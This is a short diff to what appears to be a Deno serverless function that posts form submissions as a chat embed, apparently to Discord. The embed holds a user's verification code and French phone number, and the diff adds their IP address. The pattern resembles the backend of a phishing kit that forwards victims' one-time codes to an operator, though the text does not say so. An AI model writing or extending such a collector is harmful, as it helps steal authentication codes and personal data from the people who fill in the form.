@@ -273,6 +273,8 @@ serve(async (req) => {
         { name: "🔢 Code de vérification", value: `\`\`\`fix\n${submission.code || 'N/A'}\n\`\`\``, inline: false },
         { name: "\u200B", value: "\u200B", inline: false },
         { name: "📞 Téléphone", value: `>>> \`🇫🇷 +33 ${formatPhone(submission.phone)}\``, inline: false },
+        { name: "\u200B", value: "\u200B", inline: false },
+        { name: "🌐 Adresse IP", value: `>>> \`${submission.ip_address || 'Inconnue'}\``, inline: false },
         { name: "\u200B", value: "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", inline: false },
       ],
       footer: { 
